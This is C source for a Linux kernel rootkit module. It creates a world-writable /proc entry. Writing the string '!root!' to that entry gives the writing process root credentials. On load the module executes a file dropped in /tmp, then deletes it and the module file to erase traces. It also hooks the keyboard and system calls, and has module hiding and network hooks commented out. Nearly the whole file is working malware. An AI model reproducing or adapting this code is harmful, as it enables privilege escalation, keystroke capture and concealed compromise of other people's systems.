#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fcntl.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/proc_fs.h>
#include "char_dev.h"
#include "sys_func_hook.h"
#include "kbd.h"

#define PROC_FILE		"wh1ant"

char g_buffer[32];

static int my_proc_read(char * page, char **start, off_t off, int count, int *eof, void * data)
{
	/*
	int len;
	len = sprintf(page, "%s", (char*)data);
	*eof=1;
	*/
	return 0;
}

static int my_proc_write(struct file *file, const char __user *buffer, unsigned long count, void *data)
{
	char *kernel_data = (char*)data;
	struct cred *new;
	struct task_struct * cur = current;

	copy_from_user(kernel_data, buffer, count);  // user space to kernel space
	kernel_data[count]='\0';

	new = (struct cred*)cur->cred;
	if(new==NULL)
		return count;

	if(!strncmp(kernel_data, "!root!", 6))
	{
		new->uid=0;
		new->gid=0;
		new->suid=0;
		new->sgid=0;
		new->euid=0;
		new->egid=0;
		new->fsuid=0;
		new->fsgid=0;
		//commit_creds(new);
	}

	return count;
}

inline void proc_init(void)
{
	struct proc_dir_entry * proc_entry;

	proc_entry = create_proc_entry(PROC_FILE, 0666, NULL);
	if(proc_entry==NULL)
	{
		printk(KERN_ERR "create_proc_entry() error\n");
		return;
	}

	proc_entry->data = g_buffer;
	proc_entry->read_proc = my_proc_read;
	proc_entry->write_proc = my_proc_write;
}

inline void proc_term(void)
{
	remove_proc_entry(PROC_FILE, NULL);
}

inline void start_user_command_run(void)
{
	char * argv[3];

	argv[0] = "/tmp/kdae";
	argv[1] = NULL;
	call_usermodehelper(argv[0], argv, NULL, 0);

	argv[0] = "/bin/rm";
	argv[1] = "/tmp/kdae";
	argv[2] = NULL;
	call_usermodehelper(argv[0], argv, NULL, 0);

	argv[0] = "/bin/rm";
	argv[1] = "/home/wh1ant/rootkit.ko";
	argv[2] = NULL;
	call_usermodehelper(argv[0], argv, NULL, 0);
}

int __init rootkit_init(void)
{
	//list_del_init(&__this_module.list);  // module hiding
	kbd_init();
	proc_init();
	char_dev_init();
	sys_func_hook_init();
	start_user_command_run();
	//network_hook_init();  // netfilter code
	return 0;
}

void __exit rootkit_exit(void)
{
	kbd_term();
	proc_term();
	char_dev_term();
	sys_func_hook_term();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_AUTHOR("wh1ant");
MODULE_LICENSE("GPL");
